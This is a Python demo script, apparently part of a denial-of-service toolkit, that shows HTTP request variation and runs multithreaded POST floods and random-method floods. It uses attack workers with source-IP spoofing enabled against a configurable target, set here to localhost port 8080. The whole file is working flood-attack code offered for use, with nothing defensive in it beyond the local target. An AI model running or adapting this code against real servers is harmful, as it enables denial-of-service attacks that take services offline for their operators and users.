#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Example 3: HTTP Methods Variation Demo
Demonstrates using different HTTP methods (GET, POST, HEAD, OPTIONS, etc.)
"""

import sys
sys.path.insert(0, '..')

from src import (
    AttackWorker,
    AttackStatistics,
    HTTPMethod,
    HTTPMethodBuilder,
    Colors,
    setup_logging
)
import threading
import time

def demo_http_methods():
    """Demo all available HTTP methods"""
    print(f"{Colors.OKCYAN}{'='*60}")
    print(f"HTTP Methods Demo")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    print(f"{Colors.OKGREEN}Available HTTP Methods:{Colors.ENDC}")
    for method in HTTPMethod:
        print(f"  • {method.value}")
    
    print(f"\n{Colors.OKGREEN}Sample Requests:{Colors.ENDC}\n")
    
    # Demo each method
    methods = [
        ("GET", HTTPMethodBuilder.build_get),
        ("POST", HTTPMethodBuilder.build_post),
        ("HEAD", HTTPMethodBuilder.build_head),
        ("OPTIONS", HTTPMethodBuilder.build_options),
    ]
    
    for method_name, builder in methods:
        print(f"{Colors.OKCYAN}--- {method_name} Request ---{Colors.ENDC}")
        request = builder(
            target_ip="192.168.1.100",
            path=f"/?test={method_name.lower()}",
            spoofed_ip="203.45.67.89"
        )
        # Show first 3 lines
        lines = request.split('\r\n')[:3]
        for line in lines:
            print(f"  {line}")
        print()

def attack_with_post():
    """Example: Attack using POST method"""
    print(f"\n{Colors.OKGREEN}{'='*60}")
    print(f"Attack Example: POST Flood")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    # Configuration
    target_ip = "127.0.0.1"
    target_port = 8080
    threads_count = 10
    
    print(f"Target: {target_ip}:{target_port}")
    print(f"Method: POST")
    print(f"Threads: {threads_count}")
    print(f"Spoofing: ENABLED\n")
    
    # Setup
    setup_logging("post_flood_demo.log")
    stats = AttackStatistics()
    
    # Start workers with POST method
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(
            target_ip,
            target_port,
            stats,
            worker_id=i,
            use_spoofing=True,
            http_method=HTTPMethod.POST  # ← Use POST!
        )
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
    
    # Run for 15 seconds
    try:
        print(f"{Colors.WARNING}Running POST flood for 15 seconds...{Colors.ENDC}\n")
        for i in range(15):
            time.sleep(1)
            if (i + 1) % 5 == 0:
                current = stats.get_stats()
                print(f"[{i+1}s] Active: {current['connections_active']}, "
                      f"Packets: {current['total_packets']}")
    except KeyboardInterrupt:
        pass
    
    # Stop
    for worker in workers:
        worker.stop()
    
    time.sleep(1)
    
    # Results
    final = stats.get_stats()
    print(f"\n{Colors.OKBLUE}{'='*60}")
    print(f"Results")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Connections: {final['connections_established']}")
    print(f"Success Rate: {final['success_rate']:.2f}%")
    print(f"Total Packets: {final['total_packets']}{Colors.ENDC}\n")

def attack_with_random_methods():
    """Example: Attack using random methods"""
    print(f"\n{Colors.OKGREEN}{'='*60}")
    print(f"Attack Example: Random Methods")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    # Configuration
    target_ip = "127.0.0.1"
    target_port = 8080
    threads_count = 10
    
    print(f"Target: {target_ip}:{target_port}")
    print(f"Method: RANDOM (GET/POST/HEAD/OPTIONS)")
    print(f"Threads: {threads_count}\n")
    
    # Setup
    stats = AttackStatistics()
    
    # Start workers with random methods
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(
            target_ip,
            target_port,
            stats,
            worker_id=i,
            use_spoofing=True,
            randomize_method=True  # ← Randomize methods!
        )
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
    
    # Run for 15 seconds
    try:
        print(f"{Colors.WARNING}Running random methods for 15 seconds...{Colors.ENDC}\n")
        for i in range(15):
            time.sleep(1)
            if (i + 1) % 5 == 0:
                current = stats.get_stats()
                print(f"[{i+1}s] Connections: {current['connections_active']}, "
                      f"Packets: {current['total_packets']}")
    except KeyboardInterrupt:
        pass
    
    # Stop
    for worker in workers:
        worker.stop()
    
    time.sleep(1)
    
    # Results
    final = stats.get_stats()
    print(f"\n{Colors.OKBLUE}{'='*60}")
    print(f"Results")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"{Colors.OKGREEN}Connections: {final['connections_established']}")
    print(f"Success Rate: {final['success_rate']:.2f}%{Colors.ENDC}\n")

def main():
    print(f"\n{Colors.BOLD}{Colors.OKGREEN}")
    print("╔" + "="*58 + "╗")
    print("║" + " "*15 + "HTTP METHODS VARIATION DEMO" + " "*15 + "║")
    print("╚" + "="*58 + "╝")
    print(f"{Colors.ENDC}\n")
    
    # Demo 1: Show all methods
    demo_http_methods()
    
    input(f"{Colors.WARNING}Press Enter to run POST flood demo...{Colors.ENDC}")
    
    # Demo 2: POST flood
    attack_with_post()
    
    input(f"{Colors.WARNING}Press Enter to run random methods demo...{Colors.ENDC}")
    
    # Demo 3: Random methods
    attack_with_random_methods()
    
    print(f"\n{Colors.OKGREEN}{'='*60}")
    print("Demo Complete!")
    print(f"{'='*60}{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
